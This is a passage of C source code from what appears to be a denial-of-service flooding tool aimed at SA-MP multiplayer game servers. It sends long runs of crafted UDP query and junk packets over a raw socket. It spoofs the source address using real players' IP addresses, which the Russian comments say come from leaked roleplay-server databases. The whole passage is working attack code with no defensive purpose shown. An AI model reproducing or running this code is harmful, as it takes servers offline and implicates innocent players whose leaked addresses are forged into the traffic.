		PKT->samp_aa8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_pp1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_pp30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// новый мусорный трафик про хуй прассышь че 8
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_m1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz35(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz36(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz39(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz40(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz41(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz42(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz43(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz44(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz45(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

